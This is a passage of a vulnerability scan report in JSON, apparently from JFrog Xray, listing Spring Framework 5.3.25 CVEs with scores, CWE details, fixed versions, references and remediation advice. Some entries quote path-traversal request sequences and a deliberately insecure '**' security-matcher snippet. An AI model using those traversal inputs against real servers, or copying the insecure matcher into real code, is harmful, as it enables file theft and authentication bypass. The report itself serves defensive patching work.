            "cwe_details": {
              "CWE-1333": {
                "name": "Inefficient Regular Expression Complexity",
                "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
              },
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              }
            }
          }
        ],
        "summary": "Applications that parse ETags from \"If-Match\" or \"If-None-Match\" request headers are vulnerable to DoS attack.\n\nUsers of affected versions should upgrade to the corresponding fixed version.\n\nUsers of older, unsupported versions could enforce a size limit on \"If-Match\" and \"If-None-Match\" headers, e.g. through a Filter.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-web:5.3.25": {
            "fixed_versions": [
              "[5.3.38]",
              "[6.0.23]",
              "[6.1.12]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-644055",
        "references": [
          "https://github.com/spring-projects/spring-framework/commit/582bfccbb72e5c8959a0b472d1dc7d03a20520f3",
          "https://github.com/advisories/GHSA-2rmj-mq67-h97g",
          "https://spring.io/security/cve-2024-38809",
          "https://github.com/spring-projects/spring-framework/commit/8d16a50907c11f7e6b407d878a26e84eba08a533",
          "https://github.com/spring-projects/spring-framework/commit/bb17ad8314b81850a939fd265fb53b3361705e85",
          "https://github.com/spring-projects/spring-framework/issues/33372",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38809"
        ]
      }
    ],
    "component_id": "gav://org.springframework:spring-web:5.3.25",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "c1883b7d-3ad9-4a5a-4ed9-60d3a336257a",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2024-38819",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-22"
            ],
            "cwe_details": {
              "CWE-22": {
                "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
                "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "8"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.25": {
            "fixed_versions": [
              "[6.1.14]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-646856",
        "references": [
          "https://spring.io/security/cve-2024-38819",
          "https://github.com/spring-projects/spring-framework/commit/fb7890d73975a3d9e0763e0926df2bd0a608e87e",
          "https://github.com/spring-projects/spring-framework/issues/33689",
          "https://security.netapp.com/advisory/ntap-20250110-0010",
          "https://github.com/spring-projects/spring-framework/commit/3bfbe30a7814c9ea1556d40df9bd87ddb3ba372d",
          "https://security.netapp.com/advisory/ntap-20250110-0010/",
          "https://github.com/advisories/GHSA-g5vr-rgqm-vf78",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38819"
        ],
        "extended_information": {
          "short_description": "Path traversal in Spring WebMvc and WebFlux with non-default configuration allows network attackers to leak arbitrary files.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote leak of arbitrary files"
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The vulnerability is exploitable only if all of the following conditions are true -\n1. The Spring application uses `RouterFunctions` to serve static resources\n2. Resource handling is explicitly configured with a `FileSystemResource` location\n3. The Spring Security HTTP firewall is disabled\n4. The Spring application is not served by Apache Tomcat or Eclipse Jetty\n\nExample of Spring code that fulfills conditions 1\u00262 -\n```java\nResource location = new FileSystemResource(\"public-resources/\");\nRouterFunction\u003cServerResponse\u003e resources = RouterFunctions.resources(\"/resources/**\", location);\n```\n\nConditions 3 \u0026 4 are very unlikely since -\n*  The Spring Security HTTP firewall is enabled by default, for every Spring Boot application that has Spring Security included in its classpath\n\n* Apache Tomcat is the default Servlet container for Spring Boot",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "An attacker can simply send an HTTP request for a static resource that contains encoded path traversal characters (`%2E%2E%2F`) in order to fetch arbitrary files from the server"
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38816",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-22"
            ],
            "cwe_details": {
              "CWE-22": {
                "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
                "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "8"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.\n\nSpecifically, an application is vulnerable when both of the following are true:\n\n  *  the web application uses RouterFunctions to serve static resources\n  *  resource handling is explicitly configured with a FileSystemResource location\n\n\nHowever, malicious requests are blocked and rejected when any of the following is true:\n\n  *  the  Spring Security HTTP Firewall https://docs.spring.io/spring-security/reference/servlet/exploits/firewall.html  is in use\n  *  the application runs on Tomcat or Jetty",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.25": {
            "fixed_versions": [
              "[6.1.13]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-643087",
        "references": [
          "https://spring.io/security/cve-2024-38816",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38816",
          "https://security.netapp.com/advisory/ntap-20241227-0001/",
          "https://security.netapp.com/advisory/ntap-20241227-0001",
          "https://github.com/spring-projects/spring-framework/commit/d86bf8b2056429edf5494456cffcb2b243331c49",
          "https://github.com/advisories/GHSA-cx7f-g6mp-7hqm"
        ],
        "extended_information": {
          "short_description": "Path traversal in Spring WebMvc and WebFlux with non-default configuration allows network attackers to leak arbitrary files.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote leak of arbitrary files"
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The vulnerability is exploitable only if all of the following conditions are true -\n1. The Spring application uses `RouterFunctions` to serve static resources\n2. Resource handling is explicitly configured with a `FileSystemResource` location\n3. The Spring Security HTTP firewall is disabled\n4. The Spring application is not served by Apache Tomcat or Eclipse Jetty\n\nExample of Spring code that fulfills conditions 1\u00262 -\n```java\nResource location = new FileSystemResource(\"public-resources/\");\nRouterFunction\u003cServerResponse\u003e resources = RouterFunctions.resources(\"/resources/**\", location);\n```\n\nConditions 3 \u0026 4 are very unlikely since -\n*  The Spring Security HTTP firewall is enabled by default, for every Spring Boot application that has Spring Security included in its classpath\n\n* Apache Tomcat is the default Servlet container for Spring Boot",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "An attacker can simply send an HTTP request for a static resource that contains path traversal characters (`../`) in order to fetch arbitrary files from the server"
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38828",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cwe": [
              "CWE-400"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              }
            }
          }
        ],
        "summary": "Spring MVC controller methods with an @RequestBody byte[] method parameter are vulnerable to a DoS attack.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.25": {
            "fixed_versions": [
              "[5.3.42]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-654589",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38828",
          "https://github.com/advisories/GHSA-w3c8-7r8f-9jp8",
          "https://security.netapp.com/advisory/ntap-20250509-0009",
          "https://security.netapp.com/advisory/ntap-20250509-0009/",
          "https://spring.io/security/cve-2024-38828"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2023-20860",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "cwe": [
              "NVD-CWE-noinfo"
            ]
          }
        ],
        "summary": "Spring Framework running version 6.0.0 - 6.0.6 or 5.3.0 - 5.3.25 using \"**\" as a pattern in Spring Security configuration with the mvcRequestMatcher creates a mismatch in pattern matching between Spring Security and Spring MVC, and the potential for a security bypass.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.25": {
            "fixed_versions": [
              "[5.3.26]",
              "[6.0.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.25"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-445065",
        "references": [
          "https://github.com/spring-projects/spring-framework/commit/202fa5cdb3a3d0cfe6967e85fa167d978244f28a",
          "https://security.netapp.com/advisory/ntap-20230505-0006",
          "https://spring.io/security/cve-2023-20860",
          "https://security.netapp.com/advisory/ntap-20230505-0006/",
          "https://github.com/advisories/GHSA-7phw-cxx7-q9vq",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-20860"
        ],
        "extended_information": {
          "short_description": "Improper pattern matching in Spring Framework can lead to authentication bypass when using an unprefixed double wildcard pattern (`**`).",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nAn issue has been identified when an unprefixed double wildcard pattern (`**`) is used as the pattern forwarded to `mvcRequestMatcher`. Since the `**` pattern is not properly supported by the Spring's `mvcRequestMatcher`, it does not apply the security settings as intended, which allows an attacker to bypass any security settings and perform unauthenticated requests on all endpoints.\n\nVulnerable code snippet -\n```\npublic SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n    http.securityMatcher(\"**\");\n    http.authorizeHttpRequests().anyRequest().authenticated();\n    http.httpBasic();\n    return http.build();\n\n@GetMapping(\"/foo\")\n@ResponseBody\npublic String foo() {\n    return \"securitydata\";\n}\n```\n\nIn the above example, all requests to all endpoints should theoretically be authenticated but the issue causes the exact opposite: the `/foo` endpoint is accessible without authentication.\n\nThe following matchers are vulnerable to this issue - \n\n* mvcRequestMatcher(String pattern)\n* antMatchers(String... antPatterns)\n* regexMatchers(String... regexPatterns)\n* mvcMatchers(String... mvcPatterns)\n* securityMatcher(String pattern)\n* requestMatchers(String... mvcPatterns)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The attacker must find an application that uses the `**` pattern in one of the following matchers, which is very rare. The most common pattern used is `/endpoint_name/**` which is not vulnerable to this issue.\n\n* mvcRequestMatcher\n* antMatchers\n* regexMatchers\n* mvcMatchers\n* securityMatcher\n* requestMatchers",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "A Spring application with an unprefixed double wildcard pattern (`**`) removes all security restrictions from the application and allows full access to unauthenticated attackers. The attacker does not need to perform per-target research to exploit this issue."
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This issue completely bypasses the security measures that have been defined, allowing an attacker to gain access to protected resources without the required authentication with very few effort."
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            }
          ],
          "remediation": "##### Development mitigations\n\nReplace the `**` pattern with the equivalent pattern `/**` which is not vulnerable to this issue.\nThe pattern should be replaced in the following APIs -\n\n* mvcRequestMatcher\n* antMatchers\n* regexMatchers\n* mvcMatchers\n* securityMatcher\n* requestMatchers\n\nFor example, replace the following call -\n```java\nhttp.securityMatcher(\"**\");\n```\n\nWith - \n```java\nhttp.securityMatcher(\"/**\");\n```"
        }
      }
    ],
    "component_id": "gav://org.springframework:spring-webmvc:5.3.25",
    "package_type": "maven",
    "status": "completed"
  }
]
